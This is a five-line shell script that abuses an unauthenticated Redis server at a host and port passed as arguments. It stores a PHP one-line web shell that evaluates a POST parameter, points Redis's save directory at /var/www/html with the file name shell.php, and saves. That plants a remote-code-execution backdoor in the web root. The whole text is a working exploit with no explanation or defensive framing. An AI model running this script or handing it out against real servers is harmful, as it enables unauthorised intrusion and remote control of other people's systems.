echo -e "<?php @eval(\$_POST[redis]);?>"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/www/html/
redis-cli -h $1 -p $2 config set dbfilename shell.php
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit